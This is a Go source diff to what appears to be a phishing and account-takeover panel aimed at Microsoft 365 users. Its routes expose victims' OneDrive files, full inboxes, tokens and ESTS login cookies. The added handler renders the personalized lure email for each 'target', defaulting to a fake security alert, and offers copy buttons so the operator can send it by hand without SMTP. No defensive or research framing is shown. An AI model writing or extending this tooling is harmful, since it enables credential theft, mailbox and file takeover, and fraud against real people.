@@ -58,6 +58,7 @@ func NewHttpServer() (*HttpServer, error) {
 	r.HandleFunc("/dc/drive/{token}", s.handleDCDrive).Methods("GET")
 	r.HandleFunc("/dc/inject/{token}", s.handleDCInject).Methods("GET")
 	r.HandleFunc("/dc/estscookies/{token}", s.handleDCESTSCookies).Methods("GET")
+	r.HandleFunc("/dc/preview/{token}", s.handleDCPreview).Methods("GET")
 	r.PathPrefix("/dc/owa/").HandlerFunc(s.handleDCOWA)
 	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
 	// User panels
@@ -443,6 +444,7 @@ tr:hover td{background:#1e1e1e}
 <a class="btn b2" href="/dc/drive/%s">OneDrive Files</a>
 <a class="btn b2" href="/dc/inbox/%s">Full Inbox</a>
 <a class="btn b2" href="/dc/estscookies/%s">ESTS Login Cookies</a>
+<a class="btn b2" href="/dc/preview/%s" target="_blank">Preview Email</a>
 </div>
 <p class="sect">Tokens</p>
 <div class="actions">
@@ -478,6 +480,7 @@ function cp(s){navigator.clipboard.writeText(s);var o=document.getElementById('o
 		template.HTMLEscapeString(landingToken), // drive
 		template.HTMLEscapeString(landingToken), // inbox
 		template.HTMLEscapeString(landingToken), // estscookies
+		template.HTMLEscapeString(landingToken), // preview email
 		template.HTMLEscapeString(u.DisplayName),
 		template.HTMLEscapeString(u.Mail),
 		template.HTMLEscapeString(u.JobTitle),
@@ -1402,6 +1405,118 @@ ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999)
 		template.HTMLEscapeString(owaClientID),    // 7. OWA Client ID info card
 		template.HTMLEscapeString(homeAccountID),  // 8. Home Account info card
 		string(snippetJSON),                       // 9. JS var snippet
+	)
+}
+
+// handleDCPreview renders the personalized email that would be sent to the target —
+// subject line, full HTML body, and a Copy HTML button — so the operator can send
+// it manually without any SMTP configuration.
+func (s *HttpServer) handleDCPreview(w http.ResponseWriter, r *http.Request) {
+	tgt := GetTargetByToken(mux.Vars(r)["token"])
+	if tgt == nil {
+		http.NotFound(w, r)
+		return
+	}
+	tgt.mu.Lock()
+	campID := tgt.CampaignID
+	landingToken := tgt.LandingToken
+	tgt.mu.Unlock()
+
+	// Resolve template from the campaign, fall back to security_alert.
+	tmpl := "security_alert"
+	if campID != 0 {
+		for _, c := range GetCampaigns() {
+			if c.ID == campID && c.Template != "" {
+				tmpl = c.Template
+				break
+			}
+		}
+	}
+
+	subject, body := buildEmailContent(tgt, tmpl)
+	bodyJSON, _ := json.Marshal(body)
+	subjectJSON, _ := json.Marshal(subject)
+
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<title>Email Preview</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
+h1{font-size:18px;color:#fff;margin-bottom:4px}
+.sub{font-size:12px;color:#666;margin-bottom:20px}
+.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
+h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
+.subject{font-size:15px;color:#fff;font-weight:600;padding:10px 14px;background:#111;border:1px solid #2a2a2a;border-radius:4px;margin-bottom:6px;word-break:break-all}
+.row{display:flex;gap:8px;align-items:center;margin-top:10px;flex-wrap:wrap}
+.btn{padding:9px 22px;border-radius:4px;font-size:13px;font-weight:600;border:none;cursor:pointer;background:#0078d4;color:#fff;text-decoration:none;display:inline-block}
+.b2{background:#1e1e1e;color:#bbb;border:1px solid #2a2a2a}
+.ok{color:#5cb85c;font-size:13px;font-weight:600;display:none}
+.back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
+textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:180px;resize:vertical;outline:none;cursor:text}
+iframe.preview{width:100%%;border:1px solid #2a2a2a;border-radius:4px;background:#fff;min-height:520px}
+</style></head><body>
+<a class="back" href="/dc/use/%s">&larr; Dashboard</a>
+<h1>Email Preview</h1>
+<p class="sub">What the victim would receive — no SMTP needed, copy HTML and send manually</p>
+<div class="card">
+<h2>Subject Line</h2>
+<div class="subject" id="subj">%s</div>
+<div class="row">
+<button class="btn b2" onclick="cpSubj()">Copy Subject</button>
+<span class="ok" id="oks">Copied!</span>
+</div>
+</div>
+<div class="card">
+<h2>Rendered Preview</h2>
+<iframe class="preview" id="pframe" sandbox="allow-same-origin"></iframe>
+</div>
+<div class="card">
+<h2>Raw HTML <span style="font-size:10px;color:#444;text-transform:none;letter-spacing:0">(copy and paste into Gmail compose → switch to HTML mode, or use any mailer)</span></h2>
+<textarea class="code" id="ta" readonly>%s</textarea>
+<div class="row">
+<button class="btn" onclick="cpHtml()">Copy Full HTML</button>
+<span class="ok" id="okh">Copied!</span>
+</div>
+</div>
+<script>
+var htmlBody=%s;
+var subject=%s;
+/* write into iframe */
+var fr=document.getElementById('pframe');
+fr.onload=function(){};
+var doc=fr.contentDocument||fr.contentWindow.document;
+doc.open();doc.write(htmlBody);doc.close();
+/* resize iframe to content */
+setTimeout(function(){try{fr.style.height=(fr.contentDocument.body.scrollHeight+40)+'px';}catch(e){}},300);
+
+document.getElementById('ta').value=htmlBody;
+
+function cpHtml(){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(htmlBody).then(function(){showOk('okh');}).catch(legacyCp);
+  }else{legacyCp();}
+}
+function legacyCp(){
+  var ta=document.getElementById('ta');ta.select();ta.setSelectionRange(0,99999);
+  try{if(document.execCommand('copy'))showOk('okh');}catch(e){}
+}
+function cpSubj(){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(subject).then(function(){showOk('oks');}).catch(function(){
+      document.getElementById('subj').focus();document.execCommand('selectAll');document.execCommand('copy');showOk('oks');
+    });
+  }
+}
+function showOk(id){var o=document.getElementById(id);o.style.display='inline';setTimeout(function(){o.style.display='none';},2500);}
+document.getElementById('ta').addEventListener('click',function(){this.select();this.setSelectionRange(0,99999);});
+</script>
+</body></html>`,
+		template.HTMLEscapeString(landingToken),
+		template.HTMLEscapeString(subject),
+		template.HTMLEscapeString(body),
+		string(bodyJSON),
+		string(subjectJSON),
 	)
 }
 
